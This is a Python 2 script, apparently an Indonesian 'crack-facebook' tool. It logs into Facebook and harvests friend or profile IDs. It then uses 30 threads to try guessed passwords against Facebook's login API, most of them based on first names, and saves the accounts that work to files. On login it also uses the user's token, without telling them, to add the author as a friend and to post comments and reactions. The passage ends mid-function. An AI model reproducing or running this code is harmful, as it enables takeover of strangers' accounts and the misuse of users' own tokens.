#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 vip.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """\033[1;90m╔══════════════════════════════════════════╗
\033[1;90m║\033[1;93m █████████ \033[1;91m ████████ INDONESIA RAYA🇮🇩      \033[1;90m  ║
\033[1;90m║\033[1;93m █▄█████▄█  \033[1;97m████████ 2020-2021      \033[1;90m  ║
\033[1;90m║\033[1;93m █\033[1;91m▼▼▼▼▼▼▼\033[1;93m█                              \033[1;90m  ║
\033[1;90m║\033[1;93m██ \033[1;97mHELLO \033[1;93m██ \033[1;92m☠\033[1;95m AU \033[1;93m: \033[1;96mMuhammad Rizky        \033[1;90m ║
\033[1;90m║\033[1;93m █\033[1;91m▼▼▼▼▼▼▼\033[1;93m█  \033[1;92m☠\033[1;95m GH \033[1;93m: \033[1;96mGithub.com/Kwan-XD/crack-facebook  \033[1;90m║
\033[1;90m║\033[1;96m █████████  \033[1;92m☠\033[1;95m FB \033[1;93m: \033[1;96mfb.com/Zombie.Akun11 \033[1;90m  ║
\033[1;90m║\033[1;92m  ██   ██                            \033[1;90m     ║
\033[1;90m╚══════════════════════════════════════════╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m01\033[1;97m]\033[1;96m->\033[1;93m Login via email Fb"
	print "\033[1;97m[\033[1;92m02\033[1;97m]\033[1;96m->\033[1;93m Login via token fb "
	print "\033[1;97m[\033[1;92m03\033[1;97m]\033[1;96m->\033[1;93m Get Token"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;93m Keluar/out"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar Tolol !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		tokenz()
	elif msuk =="3"or msuk =="03":
		Ambil_Token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
			
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print "\033[1;97m[\033[1;96m×\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m×\033[1;97m]"
		id = raw_input('[\033[1;95m+\033[1;97m] ID/Email =\033[1;92m ')
		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;92m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken salah !"
		time.sleep(1.7)
		masuk()

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100013185071041')
	kom = ('Gw Pake Sc Lu Bang Mantep Banget😘')
	reac = ('ANGRY')
	post = ('937777953338365')
	post2 = ('938954086554085')
	kom2 = ('Mantap Bang 😁')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	jalan("\033[1;92mInstall...")
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;93m NAMA\033[1;91m  =>\033[1;92m "+nama
	print "\033[1;97m[\033[1;92m•\033[1;97m]\033[1;93m ID\033[1;91m    =>\033[1;92m "+id
	print "\033[1;97m[\033[1;92m+\033[1;97m]\033[1;93m TTL\033[1;91m   =>\033[1;92m "+ a['birthday']
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m01\033[1;97m]\033[1;96m->\033[1;97m Crack ID Indonesia"
	print "\033[1;97m[\033[1;92m02\033[1;97m]\033[1;96m->\033[1;97m Crack ID Bangladesh/Pakistan"
	print "\033[1;97m[\033[1;92m03\033[1;97m]\033[1;96m->\033[1;97m Crack Id Semua Negara (Buat Sandi)"
	print "\033[1;97m[\033[1;92m04\033[1;97m]\033[1;96m->\033[1;97m Ambil ID Facebook"
	print "\033[1;97m[\033[1;92m05\033[1;97m]\033[1;96m->\033[1;97m Yahoo Clone"
	print "\033[1;97m[\033[1;92m06\033[1;97m]\033[1;96m->\033[1;97m Profile Guard"
	print "\033[1;97m[\033[1;92m07\033[1;97m]\033[1;96m->\033[1;97m Ikuti Saya Di Facebook"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Logout/Keluar"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar tolol!"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		bangla()
	elif unikers =="3" or unikers =="03":
		sandi()
	elif unikers =="4" or unikers =="04":
		dump()
	elif unikers =="5" or unikers =="05":
		menu_yahoo()
	elif unikers =="6" or unikers =="06":
		guard()
	elif unikers =="7" or unikers =="07":
		saya()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;93m01\033[ 1;97m]\033[1;96m->\033[1;97m Crack dari list teman"
	print "\033[1;97m[\033[1;93m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik"
	print "\033[1;97m[\033[1;93m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print " \033[1;93m         ××× \033[1;97mCRACK INDONESIA MERDEKA \033[1;93m×××"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;93m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m•\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass1
					cek = open("out/ind1.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass2
							cek = open("out/ind1.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass3
									cek = open("out/ind1.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass4
											cek = open("out/ind1.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass5
													cek = open("out/ind1.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Bangsat'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass6
															cek = open("out/ind1.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Kontol'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															w = json.load(data)
															if 'access_token' in w:
																print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass7
																	cek = open("out/ind1.txt", "a")
																	cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Cantik'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	w = json.load(data)
																	if 'access_token' in w:
																		print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass8
																			cek = open("out/ind1.txt", "a")
																			cek.write("ID:" +user+ " Pw:" +pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = c['first_name']+'321'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			w = json.load(data)
																			if 'access_token' in w:
																				print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + pass9
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in w['error_msg']:
																					print '\033[1;93m[Cekpoint] ' + user + ' ❂ ' + pass9
																					cek = open("out/ind1.txt", "a")
																					cek.write("ID:" +user+ " Pw:" +pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;93m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;93m!\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 vip.py")
	
########## CRACK BANGLADESH RUN #######
def bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;94m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari daftar teman"
	print "\033[1;97m[\033[1;94m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik/teman"
	print "\033[1;97m[\033[1;94m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_bangla()

#### PILIH BANGLADESH RUN ####
def pilih_bangla():
	reak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if reak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_bangla()
	elif reak =="1" or reak == "01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif reak =="2" or reak == "02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print " \033[1;94m    ××× \033[1;97mCRACK BANGLADESH/PAKISTAN \033[1;94m××× "
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		dok = raw_input("\033[1;97m{\033[1;94m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+dok+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;94m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;94m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			bangla()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+dok+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif reak =="3" or reak == "03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;94m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;93m[ \033[1;97mKembali \033[1;93m]')
			bangla()
	elif reak =="0" or reak == "00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_bangla()
	
	print "\033[1;97m{\033[1;94m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;94m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;94m•\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####MAIN_BANGLADESH#####
	def main(arg):
		global cpe,oke
		ubd = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+ubd+'/?access_token='+toket)
			x = json.loads(a.text)
			bos1 = x['first_name']+'123'
			data1 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			naga1 = json.load(data1)
			if 'access_token' in naga1:
				print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos1
				oke.append(ubd+bos1)
			else:
				if 'www.facebook.com' in naga1['error_msg']:
					print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos1
					cek = open("out/pakisbang.txt", "a")
					cek.write("ID:" +ubd+ " Pw:" +bos1+"\n")
					cek.close()
					cpe.append(ubd+bos1)
				else:
					bos2 = x['first_name']+'1234'
					data2 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					naga2 = json.load(data2)
					if 'access_token' in naga2:
						print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos2
						oke.append(ubd+bos2)
					else:
						if 'www.facebook.com' in naga2['error_msg']:
							print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos2
							cek = open("out/pakisbang.txt", "a")
							cek.write("ID:" +ubd+ " Pw:" +bos2+"\n")
							cek.close()
							cpe.append(ubd+bos2)
						else:
							bos3 = x['first_name']+'12345'
							data3 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							naga3 = json.load(data3)
							if 'access_token' in naga3:
								print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos3
								oke.append(ubd+bos3)
							else:
								if 'www.facebook.com' in naga3['error_msg']:
									print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos3
									cek = open("out/pakisbang.txt", "a")
									cek.write("ID:" +ubd+ " Pw:" +bos3+"\n")
									cek.close()
									cpe.append(ubd+bos3)
								else:
									bos4 = '786786'
									data4 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									naga4 = json.load(data4)
									if 'access_token' in naga4:
										print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos4
										oke.append(ubd+bos4)
									else:
										if 'www.facebook.com' in naga4['error_msg']:
											print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos4
											cek = open("out/pakisbang.txt", "a")
											cek.write("ID:" +ubd+ " Pw:" +bos4+"\n")
											cek.close()
											cpe.append(ubd+bos4)
										else:
											bos5 = x['first_name']+'786'
